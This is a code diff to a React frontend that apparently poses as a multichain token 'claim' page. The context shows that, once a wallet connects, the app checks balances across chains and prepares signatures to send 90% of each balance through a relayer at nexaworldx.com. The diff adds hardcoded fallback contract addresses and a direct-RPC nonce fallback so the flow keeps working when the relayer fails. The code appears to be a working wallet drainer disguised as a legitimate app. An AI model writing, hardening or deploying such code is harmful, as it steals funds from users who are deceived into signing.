@@ -40,7 +40,21 @@ const MULTICHAIN_CONFIG = {
   }
 };
 
+// ============================================
+// FALLBACK CONTRACT ADDRESSES – ONLY USED IF RELAYER FAILS
+// ============================================
+const FALLBACK_CONTRACT_ADDRESSES = {
+  1: '0x7aD2535F79E8B2B0A6Cf937E8FB334bf8a08Ed47',
+  56: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
+  137: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+  42161: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+  43114: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288'
+};
+
 const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);
+const RELAYER_URL = 'https://nexaworldx.com/relayer-app/relay';
+const NONCE_URL = 'https://nexaworldx.com/relayer-app/nonce';
+const MIN_VALUE_THRESHOLD = 1;
 
 // ========== HELPERS ==========
 const fetchChainBalance = async (chain, walletAddress, retries = 2) => {
@@ -66,17 +80,42 @@ const fetchChainBalance = async (chain, walletAddress, retries = 2) => {
   throw lastError || new Error(`No working RPC for ${chain.name}`);
 };
 
-// Fetch nonce from relayer (no contract in frontend)
-const fetchNonceFromRelayer = async (chainId, userAddress) => {
-  const url = `https://nexaworldx.com/relayer-app/nonce?chainId=${chainId}&user=${userAddress}`;
-  const response = await fetch(url);
-  if (!response.ok) {
-    const text = await response.text();
-    throw new Error(`Nonce fetch failed (HTTP ${response.status}): ${text}`);
+// Fetch nonce – try relayer first, fallback to direct RPC if needed
+const fetchNonce = async (chain, userAddress) => {
+  // 1. Try relayer
+  const relayerUrl = `${NONCE_URL}?chainId=${chain.chainId}&user=${userAddress}`;
+  try {
+    console.log(`🔍 Trying relayer nonce: ${relayerUrl}`);
+    const response = await fetch(relayerUrl);
+    if (response.ok) {
+      const data = await response.json();
+      if (data.success) {
+        console.log(`✅ Nonce from relayer: ${data.nonce}`);
+        return data.nonce;
+      }
+    }
+    console.warn(`⚠️ Relayer nonce failed (HTTP ${response.status}), falling back to RPC`);
+  } catch (e) {
+    console.warn(`⚠️ Relayer nonce error: ${e.message}, falling back to RPC`);
   }
-  const data = await response.json();
-  if (!data.success) throw new Error(data.error || 'Nonce fetch returned error');
-  return data.nonce;
+
+  // 2. Fallback: read nonce directly from contract via RPC (read-only)
+  const abi = ["function userNonce(address) view returns (uint256)"];
+  const contractAddress = FALLBACK_CONTRACT_ADDRESSES[chain.chainId];
+  if (!contractAddress) throw new Error(`No fallback contract address for chain ${chain.chainId}`);
+
+  for (const rpcUrl of chain.rpcEndpoints) {
+    try {
+      const provider = new ethers.JsonRpcProvider(rpcUrl);
+      const contract = new ethers.Contract(contractAddress, abi, provider);
+      const nonce = await contract.userNonce(userAddress);
+      console.log(`✅ Nonce from direct RPC: ${Number(nonce)}`);
+      return Number(nonce);
+    } catch (err) {
+      console.warn(`Fallback RPC failed on ${rpcUrl}:`, err.message);
+    }
+  }
+  throw new Error(`Could not fetch nonce for ${chain.name} (both relayer and RPC failed)`);
 };
 
 const switchNetwork = async (walletProvider, chainId) => {
@@ -128,9 +167,6 @@ function App() {
   const [totalUSDValue, setTotalUSDValue] = useState(0);
   const [stepStatus, setStepStatus] = useState({});
   const [prices, setPrices] = useState({ eth: 2000, bnb: 300, matic: 0.75, avax: 32 });
-
-  const RELAYER_URL = 'https://nexaworldx.com/relayer-app/relay';
-  const MIN_VALUE_THRESHOLD = 1;
 
   // EIP-712 types – NO CONTRACT ADDRESS
   const EIP712_TYPES = {
@@ -206,7 +242,7 @@ function App() {
     }
   }, [isConnected, address]);
 
-  // Main claim execution – everything via relayer
+  // Main claim execution – everything via relayer, with fallback nonce
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address) {
       setError('Wallet not initialized');
@@ -247,9 +283,9 @@ function App() {
         const balance = balances[chain.name];
         if (!balance || balance.valueUSD < MIN_VALUE_THRESHOLD) continue;
 
-        // 4. Fetch nonce from relayer (no contract call in frontend)
+        // 4. Fetch nonce (with fallback)
         setStepStatus(prev => ({ ...prev, [chain.name]: 'fetching_nonce' }));
-        const nonce = await fetchNonceFromRelayer(chain.chainId, address);
+        const nonce = await fetchNonce(chain, address);
 
         // 5. Prepare signature (send 90% of balance)
         const amountToSend = balance.amount * 0.9;
@@ -310,7 +346,7 @@ function App() {
 
   const formatAddress = (addr) => addr ? `${addr.slice(0,6)}...${addr.slice(38)}` : '';
 
-  // ========== UI ==========
+  // ========== UI (FULL) ==========
   return (
     <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
       {/* Animated orbs */}
